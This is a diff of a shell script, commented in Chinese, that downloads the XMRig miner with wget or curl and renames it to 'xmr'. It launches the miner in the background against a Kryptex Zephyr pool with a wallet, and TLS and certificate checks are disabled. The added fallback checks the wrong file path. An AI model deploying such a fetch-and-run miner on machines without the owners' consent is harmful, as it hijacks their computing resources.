@@ -22,13 +22,7 @@ else
 fi
 
 
-if pgrep xmrig > /dev/null; then
-    # 如果进程存在，则杀死它
-    pkill xmrig
-    echo "已杀死xmrig进程"
-else
-    echo "xmrig进程不存在"
-fi
+
 
 
 if [ ! -d "$ROOT_path" ]; then
@@ -43,9 +37,21 @@ fi
 cd "$ROOT_path" || handle_error "无法切换到目录: $ROOT_path"
 
 wget --no-check-certificate -O "xmrig.tar.gz" "$xmrig_url"
+if [ -f "xmrig.tar.gz" ];then
+    echo "wget xmrig下载成功"
+else
+    echo "文件不存在"
+    curl -L https://github.com/kryptex-miners-org/kryptex-miners/releases/download/xmrig-6-21-2/xmrig-6.21.2-linux-static-x64.tar.gz -o xmrig.tar.gz
+    if [ -f "/data/filename" ];then
+        echo "curl xmrig下载成功"
+    else
+        echo "文件不存在"
+   fi
+fi
 tar -xzf "xmrig.tar.gz" -C "$ROOT_path"
-chmod +x "$ROOT_path/xmrig"
-a='./xmrig --coin zephyr --url "zeph.kryptex.network:8888" --user "'
+mv xmrig xmr
+chmod 777 "$ROOT_path/xmr"
+a='./xmr --coin zephyr --url "zeph.kryptex.network:8888" --user "'
 c='/'
 d='" --tls -k -B '
 com="$a$wallet$c$random_number$d"
@@ -61,6 +67,13 @@ if [ -f "$start_sh" ]; then
     else
         echo "字符串 '$wallet' 不存在于文件 '$start_sh' 中"
         echo "生成启动文件"
+        if pgrep xmr > /dev/null; then
+           # 如果进程存在，则杀死它
+           pkill xmr
+           echo "已杀死xmrig进程"
+        else
+           echo "xmr进程不存在"
+        fi
         echo $com > start.sh
         chmod +x start.sh
         ./start.sh
@@ -78,7 +91,7 @@ fi
 sleep 10
 
 
-if pgrep xmrig > /dev/null; then
+if pgrep xmr > /dev/null; then
     echo "xmrig进程存在，退出Shell代码执行"
     
 else
